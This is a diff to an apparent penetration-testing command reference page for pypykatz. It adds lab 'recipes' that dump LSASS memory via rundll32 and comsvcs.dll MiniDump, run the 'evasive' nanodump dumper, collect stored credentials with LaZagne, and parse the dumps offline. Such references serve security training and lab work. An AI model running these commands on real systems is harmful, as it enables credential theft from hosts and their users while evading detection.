@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=pypykatz) · [All tools](/index)
+
 **Requires:** An LSASS minidump already obtained from your lab host; this command does not collect one.
 
 ## Read a saved dump
@@ -25,8 +27,68 @@ Replace LSASS_DUMP with the local dump file path. Missing secrets can reflect th
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=pypykatz)
+## Notebook recipes
 
-## Learning and original examples
+4 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Password Attacks: Cracking, Files, and Credential Stores](/password-attacks/password-attacks-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="9. Credential dumping">
+
+### 9. Credential dumping
+
+**Active Directory Attack Path: Worked Lab**
+
+```cmd
+:: nanodump / comsvcs to dump lsass.dmp, then parse offline on Kali:
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Windows\Temp\lss.dmp full
+:: then on Kali:  pypykatz lsa minidump lss.dmp
+LaZagne.exe all                 :: stored app/browser/wifi creds (use the .EXE, no Python needed)
+```
+
+</Accordion>
+
+<Accordion title="Parse the dump offline with pypykatz">
+
+### Parse the dump offline with pypykatz
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+pypykatz lsa minidump /path/to/lsass.dmp
+```
+
+</Accordion>
+
+<Accordion title="1. LSASS — the credential goldmine">
+
+### 1. LSASS — the credential goldmine
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+:: dump-and-parse-offline (quieter than running mimikatz on-host):
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Windows\Temp\l.dmp full
+nanodump.exe --write C:\Windows\Temp\l.dmp        :: alternative, evasive dumper
+:: on Kali:
+pypykatz lsa minidump l.dmp
+```
+
+</Accordion>
+
+<Accordion title="B. SeDebugPrivilege → read any process memory">
+
+### B. SeDebugPrivilege → read any process memory
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+:: dump lsass via the signed comsvcs.dll (lives on every Windows box)
+tasklist /fi "imagename eq lsass.exe"                 :: get the PID
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\l.dmp full
+:: then parse offline on Kali:  pypykatz lsa minidump l.dmp
+```
+
+</Accordion>
+
+</AccordionGroup>
